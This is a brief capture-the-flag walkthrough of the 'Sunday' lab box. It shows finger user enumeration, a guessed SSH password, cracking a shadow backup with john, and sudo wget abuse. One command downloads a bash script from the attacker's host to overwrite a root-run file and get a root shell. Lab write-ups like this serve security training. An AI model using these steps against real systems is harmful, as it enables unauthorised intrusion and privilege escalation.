Initial scans show an interesting port, 79
All portscan shows a ssh port at 22022
It is a really old service, called finger
There's a finger mapping tool, `/opt/finger-user-enum.pl -U /usr/share/seclist/Usernames/names/names.txt -t [IP]`
We find users Sunny and Sammy. 
Since the box is Sunday, we pick the user Sunny and try with password sunday, and it works
`ssh sunny@10.129.236.44 -p 22022`

For Sunny,
sudo -l shows he can run a /root/troll as sudo.
there was a /backup/shoadow.backup file, which we crack using john to get sammy's pass
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` as cooldude!
`ssh sammy@10.129.236.44 -p 22022`
`sudo -l` shows we get run wget as sudo, gtfobins, root

---
Alternate method --
we use the wget to overwrite the /root/troll as sammy
Then run /root/troll as sunny
host a python server from kali, with the content 
```bash
#!/bin/bash

bash
```
as sammy, `sudo wget http://10.10.14.31:8990/write.sh -O /root/troll`
as sunny, `sudo /root/troll`